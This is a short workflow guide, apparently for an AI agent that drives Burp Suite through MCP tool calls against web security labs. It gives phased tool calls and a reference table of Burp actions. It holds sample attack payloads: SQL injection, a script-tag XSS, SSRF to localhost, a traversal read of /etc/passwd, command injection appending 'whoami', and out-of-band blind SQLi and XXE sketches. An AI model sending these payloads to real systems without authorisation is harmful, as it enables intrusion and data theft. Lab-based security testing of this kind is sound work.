# Hunter + Burp MCP Workflow Guide

## Attack Workflow

### Phase 1: Reconnaissance
```
1. burp(action="send", url="https://target/") → Get homepage
2. burp(action="proxy_search", regex="api|admin|login") → Find interesting endpoints
3. burp(action="scanner_issues") → Check existing findings
```

### Phase 2: Vulnerability Detection
```
# SQLi
burp(action="send", url="https://target/filter?category=Gifts' UNION SELECT NULL--")

# XSS
burp(action="send", url="https://target/search?q=<script>alert(1)</script>")

# SSRF
burp(action="send", url="https://target/stock?url=http://127.1/")

# Path Traversal
burp(action="send", url="https://target/image?file=../../../etc/passwd")

# Command Injection
burp(action="send", url="https://target/ping?ip=127.0.0.1|whoami")
```

### Phase 3: Exploitation
```
# Blind SQLi with Collaborator
burp(action="collaborator_generate") → Get OOB domain
burp(action="send", headers={"Cookie": "TrackingId=xxx'||(SELECT...)||'.COLLAB--"})
burp(action="collaborator_check") → Check for callbacks

# Blind XXE with Collaborator
burp(action="collaborator_generate") → Get OOB domain
burp(action="send", headers={"Content-Type": "application/xml"}, body="<!DOCTYPE...>")
burp(action="collaborator_check") → Check for callbacks
```

### Phase 4: Verification
```
burp(action="send", url="https://target/") → Check is-solved
burp(action="scanner_issues") → Check for new findings
```

## Burp MCP Actions Reference

| Action | Purpose | Key Params |
|--------|---------|------------|
| send | HTTP/2 request | url, method, headers, body |
| send_http1 | HTTP/1.1 request | url, method, headers, body |
| repeater | Send to Repeater | url, tab_name |
| intruder | Send to Intruder | url, tab_name |
| collaborator_generate | OOB payload | - |
| collaborator_check | OOB callbacks | - |
| scanner_issues | Get findings | count, severity_filter |
| proxy_history | Get history | count |
| proxy_search | Search history | regex |
| set_intercept | Toggle intercept | enabled |
| set_scanner | Toggle scanner | enabled |
| exploit_server | Store+deliver exploit | url=exploit_host, body=html |
